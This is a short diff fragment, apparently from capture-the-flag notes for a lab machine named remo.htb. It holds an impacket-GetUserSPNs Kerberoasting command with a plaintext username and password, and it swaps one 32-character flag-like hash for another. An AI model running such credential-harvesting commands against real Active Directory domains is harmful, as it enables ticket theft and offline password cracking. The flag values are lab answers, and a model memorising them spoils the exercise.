@@ -17,4 +17,4 @@ https://drive.google.com/file/d/1-WS5xGu2Uqj6tdqOiydvh0DFOZUNHdjA/view?usp=shari
 
 impacket-GetUserSPNs -request -dc-ip <domain_controller_ip> remo.htb/'o.rashed':'MyP@ssw0rd!'
 
-5f61c10dffbc77a704d76016a22f1664
+03e1d2b376c37ab3f5319922053953eb
